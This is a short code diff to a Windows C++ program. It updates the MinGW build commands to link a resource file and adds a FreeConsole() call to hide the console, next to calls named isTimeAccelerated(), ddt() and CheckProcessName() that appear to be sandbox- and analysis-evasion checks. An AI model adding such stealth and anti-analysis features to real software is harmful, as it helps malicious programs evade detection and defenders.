@@ -1,4 +1,5 @@
-// x86_64-w64-mingw32-g++ new2.cpp -lwininet -static-libgcc -static-libstdc++ -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections
+// x86_64-w64-mingw32-windres new2.rc -O coff -o new2.res
+// x86_64-w64-mingw32-g++ new2.cpp new2.res -lwininet -static-libgcc -static-libstdc++ -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -o a.exe
 
 #include <windows.h>
 #include <thread>
@@ -204,6 +205,8 @@ bool CheckProcessName() {
 }
 
 int main() {
+    FreeConsole();
+
     isTimeAccelerated();
     ddt();
     
